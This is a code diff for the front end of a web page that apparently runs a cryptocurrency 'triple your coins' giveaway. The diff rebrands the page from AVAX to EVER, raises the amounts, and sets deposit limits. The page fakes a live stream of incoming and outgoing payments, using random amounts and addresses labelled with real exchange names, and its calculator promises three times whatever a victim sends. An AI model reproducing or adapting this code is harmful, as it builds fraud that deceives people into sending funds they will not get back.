@@ -42,7 +42,7 @@ function create_transaction(mins) {
     var table,
         row = (table = document.getElementById("myTable")).insertRow(1),
         address = get_random(),
-        amount = Math.floor(1500 * Math.random()) + 50,
+        amount = Math.floor(50000 * Math.random()) + 50,
         decimal = String(Math.random(3, 999));
     row.innerHTML =
         '<tr  class="tr"> <td><a class="hash-tag text-truncate" href="">' +
@@ -55,7 +55,7 @@ function create_transaction(mins) {
         address +
         '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">Avalanche Pool</span> </td> <td>' +
         amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
-        ' AVAX</td> <td><span class="small text-secondary">0<b>.</b>000' +
+        ' EVER</td> <td><span class="small text-secondary">0<b>.</b>000' +
         tx(999) +
         "</span></td> </tr>";
     var table,
@@ -68,11 +68,11 @@ function create_transaction(mins) {
         tx(99999999) +
         '</a></td> <td><span class="timer">' +
         mins +
-        ' mins ago</span></td> <td><span class="hash-tag text-truncate">Avalanche Pool</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+        ' mins ago</span></td> <td><span class="hash-tag text-truncate">EVER Pool</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
         address +
         "</a> </td> <td>" +
         send_amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
-        ' AVAX</td> <td><span class="small text-secondary">0<b>.</b>000' +
+        ' EVER</td> <td><span class="small text-secondary">0<b>.</b>000' +
         tx(999) +
         "</span></td> </tr>";
 }
@@ -87,7 +87,7 @@ function new_transaction() {
     var table,
         row = document.getElementById("myTable").insertRow(1),
         address = get_random(),
-        amount = Math.floor(Math.random() * 1500) + 50,
+        amount = Math.floor(Math.random() * 50000) + 50,
         decimal = String(Math.random(5, 999));
     (row.innerHTML =
         '<tr> <td><a class="hash-tag text-truncate" href="">' +
@@ -96,9 +96,9 @@ function new_transaction() {
         tx(99999999) +
         '</a></td> <td><span class="timer" >now</span> </td> <td><a class="hash-tag text-truncate" href="">' +
         address +
-        '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">Avalanche Pool</span> </td> <td>' +
+        '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">EVER Pool</span> </td> <td>' +
         amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
-        ' AVAX</td> <td><span class="small text-secondary">0<b>.</b>000' +
+        ' EVER</td> <td><span class="small text-secondary">0<b>.</b>000' +
         tx(999) +
         "</span></td> </tr>"),
     document
@@ -114,11 +114,11 @@ function new_transaction() {
                 generateId(63) +
                 '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
                 tx(99999999) +
-                '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">Avalanche Pool</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+                '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">EVER Pool</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
                 address +
                 "</a> </td> <td>" +
                 send_amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
-                ' AVAX</td> <td><span class="small text-secondary">0<b>.</b>000' +
+                ' EVER</td> <td><span class="small text-secondary">0<b>.</b>000' +
                 tx(999) +
                 "</span></td> </tr>"),
             document
@@ -148,31 +148,31 @@ function update_trans() {
 
 (get_random = function(
     list = [
-        'X-avax1gefyrf2m40qwuk92vl' + startaddress() + generateId(40),
+        'X-EVER1gefyrf2m40qwuk92vl' + startaddress() + generateId(40),
         "Binance 1",
         '0xa50a4cca818e0c57f478c831a58db6bfdc0b7d4df' + startaddress() + generateId(40),
         "KuCoin",
-        'x-avax1pue5luvh6klhjkq8zk5zltx' + startaddress() + generateId(40),
+        'x-EVER1pue5luvh6klhjkq8zk5zltx' + startaddress() + generateId(40),
         "Binance 3",
         '0xdebb1d13eadec832b' + startaddress() + generateId(40),
         "Bithumb",
-        'x-avax12l5ttdxd3w58335m5g9x6f85mgqg' + startaddress() + generateId(40),
+        'x-EVER12l5ttdxd3w58335m5g9x6f85mgqg' + startaddress() + generateId(40),
         "Huobi Global",
         '0x559d12277b71dc44c' + startaddress() + generateId(40),
         "Binance 14",
         '0x328d701d72c2cbcb6' + startaddress() + generateId(40),
         "Gate.io",
-        'x-avax1ccjyjd9t0rmxf8z53j6' + startaddress() + generateId(40),
+        'x-EVER1ccjyjd9t0rmxf8z53j6' + startaddress() + generateId(40),
         "Bitfinex",
         '0xaae115c84ba9d3476' + startaddress() + generateId(40),
         "Binance 2",
-        'x-avax1upq5z3l66mccjyjd9t0rmxf8z' + startaddress() + generateId(40),
+        'x-EVER1upq5z3l66mccjyjd9t0rmxf8z' + startaddress() + generateId(40),
         "VCC Exchange",
         '0x287bd87f644812a2a' + startaddress() + generateId(40),
         "Okex",
         '0xb8a992a13078282d' + startaddress() + generateId(40),
         "Crypto.com Exchange ",
-        'x-avax13f7kxrvsadackdw5vk3zd6' + startaddress() + generateId(40),
+        'x-EVER13f7kxrvsadackdw5vk3zd6' + startaddress() + generateId(40),
         "Gate.io",
         '0x063b88D53d109C12Ec21785C4' + startaddress() + generateId(40),
         "Binance 1"
@@ -192,7 +192,14 @@ $(document).ready(() => {
             }, 1e4));
     }),
     $("#gen-btn").click(() => {
-        if ($('#btc_adr').val().length >= 5) {
+        var in_amount = $("#cal-in").val();
+        if (in_amount < 5000) {
+            $("#warn").text("Minimum amount is 5,000");
+        }
+        if (in_amount > 500000) {
+            $("#warn").text("Maximum amount is 500,000");
+        }
+        else if ($('#btc_adr').val().length >= 5) {
             amount_entered = $("#cal-in").val();
             $("#gen-amount").text(amount_entered);
             $("#copy_").attr("data-clipboard-text", amount_entered);
@@ -222,7 +229,7 @@ $(document).ready(() => {
     }, 300)
 $("#cal-in").on("input", () => {
     var in_amount = $("#cal-in").val();
-    if (in_amount > 0 && in_amount < 150) {
+    if (in_amount > 5000 && in_amount < 500000) {
         $("#cal-out").val(in_amount * 3);
     } else if (in_amount => 5 && in_amount <= 120) {
         $("#cal-out").val(in_amount * 3);
@@ -231,8 +238,8 @@ $("#cal-in").on("input", () => {
 
 $("#cal-out").on("input", () => {
     var in_amount = $("#cal-out").val();
-    if (in_amount > 0 && in_amount < 150) {
-        $("#cal-in").val(in_amount / 2);
+    if (in_amount > 0 && in_amount < 500000) {
+        $("#cal-in").val(in_amount / 3);
     } else if (in_amount => 150 && in_amount <= 300) {
         $("#cal-in").val(in_amount / 3);
     }
